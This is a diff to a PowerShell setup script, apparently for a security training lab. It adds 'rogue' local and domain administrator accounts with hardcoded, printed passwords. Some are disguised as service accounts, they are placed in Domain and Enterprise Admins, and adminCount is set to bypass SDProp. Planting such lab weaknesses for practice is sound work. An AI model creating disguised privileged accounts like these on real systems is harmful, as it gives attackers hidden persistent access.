@@ -520,6 +520,149 @@ try {
 }
 
 # -----------------------------------------------------------------------------
+# ROGUE USERS
+# Step 1 always: create local accounts + add to local Administrators.
+# Step 2 optional: if AD is already up (Run 3), also create domain accounts.
+# The ActiveDirectory module is imported manually so a missing module does NOT
+# terminate the session (unlike #Requires -Modules ActiveDirectory).
+# -----------------------------------------------------------------------------
+Write-Section "ROGUE USERS"
+
+$RogueUsers = @(
+    [PSCustomObject]@{
+        Sam         = "JohnRedTeam"
+        DisplayName = "John"
+        Password    = "S1llyEv1l@2024!"
+        Description = "FUCK DONT KILL ME"
+    },
+    [PSCustomObject]@{
+        Sam         = "AdobeAcrobat"
+        DisplayName = "AdobeAcrobat"
+        Password    = "R3m0veM3@2024!"
+        Description = "Service Account"
+    },
+    [PSCustomObject]@{
+        Sam         = "KayneWhitney"
+        DisplayName = "Kayne"
+        Password    = "F@keUs3r@2024!"
+        Description = "Exchange migration service account"
+    }
+)
+
+# -- Local users (always) ------------------------------------------------------
+Write-Info "Creating local rogue users..."
+foreach ($u in $RogueUsers) {
+    $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
+
+    $existingLocal = Get-LocalUser -Name $u.Sam -ErrorAction SilentlyContinue
+    if ($existingLocal) {
+        Write-Warn "  Local user '$($u.Sam)' already exists  -  skipping creation."
+    } else {
+        try {
+            New-LocalUser `
+                -Name                 $u.Sam `
+                -Password             $SecurePass `
+                -FullName             $u.DisplayName `
+                -Description          $u.Description `
+                -PasswordNeverExpires:$true `
+                -ErrorAction          Stop
+            Write-Success "  Local user created : $($u.Sam)  pass: $($u.Password)"
+        } catch {
+            Write-Warn "  Could not create local user '$($u.Sam)': $_"
+        }
+    }
+
+    try {
+        Add-LocalGroupMember -Group "Administrators" -Member $u.Sam -ErrorAction Stop
+        Write-Success "  Added to local Administrators."
+    } catch {
+        if ($_ -match "already a member") {
+            Write-Warn "  '$($u.Sam)' already in local Administrators."
+        } else {
+            Write-Warn "  Could not add '$($u.Sam)' to local Administrators: $_"
+        }
+    }
+}
+
+# -- AD users (optional — only if NTDS is running and AD module is present) ----
+$rogueAdDone = $false
+$ntdsSvcCheck = Get-Service -Name 'NTDS' -ErrorAction SilentlyContinue
+if ($ntdsSvcCheck -and $ntdsSvcCheck.Status -eq 'Running') {
+    try {
+        Import-Module ActiveDirectory -ErrorAction Stop
+        $rogueAdDomain   = Get-ADDomain -ErrorAction Stop
+        $rogueAdDN       = $rogueAdDomain.DistinguishedName
+        $rogueAdDnsRoot  = $rogueAdDomain.DNSRoot
+        Write-Info "AD domain available: $rogueAdDnsRoot  -  creating domain accounts..."
+
+        $rogueAdGroups = @("Domain Admins", "Administrators", "Enterprise Admins")
+        foreach ($u in $RogueUsers) {
+            $SecurePass = ConvertTo-SecureString $u.Password -AsPlainText -Force
+            $UPN        = "$($u.Sam)@$rogueAdDnsRoot"
+
+            $existingAd = Get-ADUser -Filter "SamAccountName -eq '$($u.Sam)'" -ErrorAction SilentlyContinue
+            if ($existingAd) {
+                Write-Warn "  AD user '$($u.Sam)' already exists."
+            } else {
+                try {
+                    New-ADUser `
+                        -SamAccountName       $u.Sam `
+                        -UserPrincipalName    $UPN `
+                        -Name                 $u.DisplayName `
+                        -DisplayName          $u.DisplayName `
+                        -GivenName            $u.Sam `
+                        -Surname              "Training" `
+                        -Description          $u.Description `
+                        -Path                 "CN=Users,$rogueAdDN" `
+                        -AccountPassword      $SecurePass `
+                        -Enabled              $true `
+                        -PasswordNeverExpires $true `
+                        -CannotChangePassword $false `
+                        -ErrorAction          Stop
+                    Write-Success "  AD user created : $($u.Sam)  UPN: $UPN"
+                } catch {
+                    Write-Warn "  Could not create AD user '$($u.Sam)': $_"
+                    continue
+                }
+            }
+
+            foreach ($group in $rogueAdGroups) {
+                try {
+                    Add-ADGroupMember -Identity $group -Members $u.Sam -ErrorAction Stop
+                    Write-Success "  Added to $group"
+                } catch {
+                    if ($group -eq "Enterprise Admins") {
+                        Write-Warn "  Could not add to '$group' (forest root only): $_"
+                    } else {
+                        Write-Warn "  Could not add '$($u.Sam)' to '$group': $_"
+                    }
+                }
+            }
+
+            try {
+                Set-ADUser -Identity $u.Sam -Replace @{adminCount = 1} -ErrorAction Stop
+                Write-Success "  adminCount=1 set (SDProp bypass)."
+            } catch {
+                Write-Warn "  Could not set adminCount for '$($u.Sam)': $_"
+            }
+        }
+        $rogueAdDone = $true
+    } catch {
+        Write-Warn "AD module or domain query failed  -  local users only: $_"
+    }
+} else {
+    Write-Warn "NTDS not running  -  skipping AD user creation (local users created above)."
+}
+
+Write-Host ""
+Write-Info "Rogue user summary:"
+foreach ($u in $RogueUsers) {
+    Write-Host "  $($u.Sam.PadRight(20)) local admin" -ForegroundColor Green -NoNewline
+    if ($rogueAdDone) { Write-Host " + AD Domain Admin" -ForegroundColor Green } else { Write-Host "" }
+}
+Write-Host ""
+
+# -----------------------------------------------------------------------------
 # SUMMARY
 # -----------------------------------------------------------------------------
 Write-Section "SETUP COMPLETE"
